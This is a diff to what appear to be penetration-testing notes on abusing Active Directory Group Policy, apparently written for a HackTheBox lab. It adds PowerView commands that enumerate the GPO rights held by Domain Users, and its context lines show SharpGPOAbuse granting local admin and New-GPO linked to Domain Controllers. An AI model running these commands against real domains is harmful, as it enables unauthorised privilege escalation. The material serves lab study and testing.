@@ -165,7 +165,13 @@ Abuse:
 ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy" (add anirudh to local admin group)
 gpupdate /force
 ```
-### Abusing "Group Policy Creator Owners"
+Enumerating Domain Users' GPO Rights
+```
+Powerview.ps1
+$sid=Convert-NameToSid "Domain Users"
+Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
+```
+### Abusing "Group Policy Creator Owners" Group
 Members of this group can create and modify Group Policy Objects in the domain
 ```
 New-GPO -Name {{GPO-Name}} | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
